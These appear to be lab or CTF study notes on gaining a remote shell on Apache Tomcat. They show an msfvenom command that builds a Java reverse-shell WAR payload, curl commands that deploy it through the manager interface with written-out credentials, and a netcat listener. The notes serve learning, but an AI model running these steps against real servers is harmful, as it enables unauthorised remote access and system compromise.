## What is a `.war` file?

A `.war` file* stands for **Web Application Archive** — it’s the Java equivalent of a **.zip** or **.jar** file, but used specifically for **deploying web apps on servers like Apache Tomcat**.

- It contains Java classes, configuration files, and web resources (like HTML, JSP, etc.).
    
- Web servers such as **Apache Tomcat**, **JBoss**, or **GlassFish** can **deploy** `.war` files directly.
    
- When deployed, it becomes an accessible web application under a URL path like: `http://<server>:8080/shell/`


## msfvenom

#Attacking_machine 
1. Generated a WAR payload with `msfvenom`.
```
msfvenom -p java/shell_reverse_tcp LHOST=<ATTACKING MACHINE IP> LPORT=443 -f war > shell.war
```

| Part                        | Explanation                                                        |
| --------------------------- | ------------------------------------------------------------------ |
| `msfvenom`                  | The payload generator (part of Metasploit).                        |
| `-p java/shell_reverse_tcp` | Payload type — a **Java reverse shell** that connects back to you. |
| `LHOST=MACHINE IP           | Your local IP (where the reverse connection will come to).         |
| `LPORT=443`                 | The port on your machine to receive the shell.                     |
| `-f war`                    | Output format = **WAR web app file** (deployable on Tomcat).       |
| `> shell.war`               | Save the generated payload as `shell.war`.                         |

2. Upload the file `shell.war` to the Tomcat Server.
```
curl -u 'webdev':'Hgj3LA$02D$Fa@21' -T shell.war 'http://<MACHINE IP>:8080/manager/text/deploy?path=/shell.war'
```

![[Screenshot_2025-10-16_05-26-25.png]]

3. Check the file has been uploaded.
```
curl -u 'webdev':'Hgj3LA$02D$Fa@21' http://<MACHINE IP>:8080/manager/text/list
```

![[Screenshot_2025-10-16_05-31-50.png]]

4. Open a netcat listener on the attacking machine.
```
nc -lnvp 443
```

5. Deploy the file.
```
curl -u 'webdev':'Hgj3LA$02D$Fa@21' http://<MACHINE IP>:8080/shell.war
```

## What happens when it’s deployed

1. Deploy the WAR file as a web app.
    
2. Launch the payload (a Java servlet) when accessed.
    
3. The payload will **connect back to your LHOST:443** and open a **reverse shell**.
    

That means you’d get a remote shell on the netcat listener. .

![[Screenshot_2025-10-16_05-47-40.png]]

